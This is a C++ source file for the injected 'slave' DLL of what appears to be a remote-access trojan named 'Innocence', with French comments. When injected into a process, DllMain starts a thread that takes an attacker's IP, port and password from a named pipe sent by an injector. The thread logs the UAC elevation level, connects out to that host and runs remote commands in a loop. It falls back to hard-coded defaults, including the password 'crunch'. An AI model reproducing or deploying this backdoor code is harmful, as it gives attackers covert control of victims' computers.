#include <windows.h>
HANDLE threadHandle;

#include <common/Innocence.hpp>
#include <log/Log.hpp>
#include <system/Uac.hpp>
#include <system/Process.hpp>
using namespace System;

#include "SlaveCore.hpp"

#include <network/Pipe.hpp>

// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
// nous envoyer l'injecteur
// pour ce faire, on utilise les "pipe" à la windows (IPC)
Common::ConnectionInfo getConnectionInfo()
{
	Common::ConnectionInfo info;
	try
	{
		Network::Pipe pipe;
		pipe.connect(Common::PIPE_NAME);
		char blaspheme [Common::CONNECTION_INFO_SIZE];
		pipe.recv(blaspheme, Common::CONNECTION_INFO_SIZE);
		std::string buffer(blaspheme, Common::CONNECTION_INFO_SIZE);
		size_t end = buffer.find_last_of(MARKER);
		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);

		std::string port_buffer;
		std::istringstream iss(buffer);

		std::getline( iss, info.ip, SEPERATOR );
		std::getline( iss, port_buffer, SEPERATOR );
		std::getline( iss, info.name, SEPERATOR );
		std::getline( iss, info.password, SEPERATOR );

		Common::fromString(port_buffer, info.port);
		pipe.disconnect();
	}
	catch(Network::PipeException&)
	{
//#ifndef INNOCENCE_DEBUG
//		throw;
//#else
		info.ip = "127.0.0.1";
		info.port = 80;
		info.password = "crunch";
		info.name = "default";
//#endif
	}
	return info;
}

DWORD WINAPI run(void)
{
	try
	{
		LOG.setIdentity(Common::identity);
		LOG.addObserver(new Log::LogToConsole);
		LOG.addObserver(new Log::LogToCollector);
		Common::ConnectionInfo info = getConnectionInfo();	    
		
		Inhibition::SlaveCore slave(info);
		LOG << GetElevationType();
		LOG << "Trying connection on " + slave.getConnection().ip + ":" + Common::toString(slave.getConnection().port);
		while(!slave.exiting())
		{
			try
			{
				if(slave.connect())
				{
					LOG << "Session started";
					while(slave.process_command());
					LOG << "Session ended";
					slave.disconnect();
				}
				Sleep(500);
			}
			catch(Network::Deconnection&)
			{
				LOG << "Untimely disconnect";
				slave.disconnect();
			}
		}
	}
	catch(Common::Exception&)
	{
	}
	CATCH_UNKNOWN_EXCEPTION
	
    System::Process::This thisProcess;
	thisProcess.killHierarchy();
	return EXIT_SUCCESS;
}

extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER( hModule );
    UNREFERENCED_PARAMETER( lpReserved );

    switch( dwMsg )
    {
		case DLL_PROCESS_ATTACH:
			DisableThreadLibraryCalls( hModule );
			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, 0 );
			return (!threadHandle) ? FALSE : TRUE;
		case DLL_PROCESS_DETACH:
			TerminateThread(threadHandle, EXIT_SUCCESS);
			return TRUE;
    }
    return TRUE;
}
